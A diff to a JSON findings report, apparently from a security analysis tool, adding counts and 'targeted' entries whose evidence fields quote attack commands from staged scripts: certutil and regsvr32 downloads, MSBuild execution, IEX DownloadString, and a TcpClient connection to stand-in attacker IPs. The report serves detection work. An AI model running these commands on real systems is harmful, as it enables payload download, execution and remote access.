@@ -252,6 +252,42 @@
     "evidence": null
   },
   {
+    "item": "targeted",
+    "section": "summary",
+    "value": 5,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "targeted device",
+    "section": "summary",
+    "value": 2,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
+    "item": "targeted ip",
+    "section": "summary",
+    "value": 3,
+    "detail": null,
+    "basis": null,
+    "files": null,
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": null
+  },
+  {
     "item": "exposed",
     "section": "summary",
     "value": 4,
@@ -382,6 +418,66 @@
     "atlas": "AML.T0072, AML.T0138",
     "targets": null,
     "evidence": null
+  },
+  {
+    "item": "Microsoft.NET",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "device: prior",
+    "basis": null,
+    "files": "20261020_101000_step03_exec.ps1:4",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)"
+  },
+  {
+    "item": "corp.example",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "device: prior",
+    "basis": null,
+    "files": "20261020_100000_step01_recon.ps1:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)"
+  },
+  {
+    "item": "203.0.113.10",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261020_100500_step02_download.ps1:1, 20261020_101000_step03_exec.ps1:2, 20261020_103000_step07_cleanup.bat:2",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\\Users\\Public\\a.b64 (20261020_100500_step02_download.ps1:1)\nregsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)\ncertutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\\c.exe (20261020_103000_step07_cleanup.bat:2)"
+  },
+  {
+    "item": "203.0.113.20",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261020_102000_step05_dotnet.ps1:2, 20261020_102500_step06_pinvoke.ps1:12",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "$b64 = $wc.DownloadString(\"http://203.0.113.20/stage.txt\") (20261020_102000_step05_dotnet.ps1:2)\nIEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.20/next.ps1\") (20261020_102500_step06_pinvoke.ps1:12)"
+  },
+  {
+    "item": "203.0.113.30",
+    "section": "targeted",
+    "value": "medium",
+    "detail": "ip: prior, public",
+    "basis": null,
+    "files": "20261020_102500_step06_pinvoke.ps1:10",
+    "attack": null,
+    "atlas": null,
+    "targets": null,
+    "evidence": "$tcp = New-Object System.Net.Sockets.TcpClient(\"203.0.113.30\", 443) (20261020_102500_step06_pinvoke.ps1:10)"
   },
   {
     "item": "svc_build",
